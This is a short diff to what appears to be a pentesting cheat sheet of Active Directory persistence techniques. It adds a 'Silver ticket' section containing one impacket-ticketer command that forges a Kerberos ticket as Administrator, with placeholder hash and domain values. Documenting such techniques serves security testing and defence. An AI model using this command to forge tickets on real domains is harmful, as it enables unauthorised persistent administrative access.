@@ -84,7 +84,7 @@ Techniques for moving between systems once initial access is gained.
 Used to maintain long-term access or full control of the domain.
 
 1. Golden Ticket  
-2. Silver Ticket  
+2. Silver Ticket
 3. Skeleton Key  
 4. AdminSDHolder Modification  
 5. GPO Hijacking  
@@ -97,6 +97,11 @@ Used to maintain long-term access or full control of the domain.
 12. AD Recycle Bin Abuse  
 13. ADFS Token Forgery  
 14. Azure AD Connect Exploitation  
+
+Silver ticket:
+```sh
+impacket-ticketer -nthash HASH -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain DOMAIN -dc-ip dc.DOMAIN -spn nonexistent/DC.DOMAIN Administrator
+```
 
 ---
 
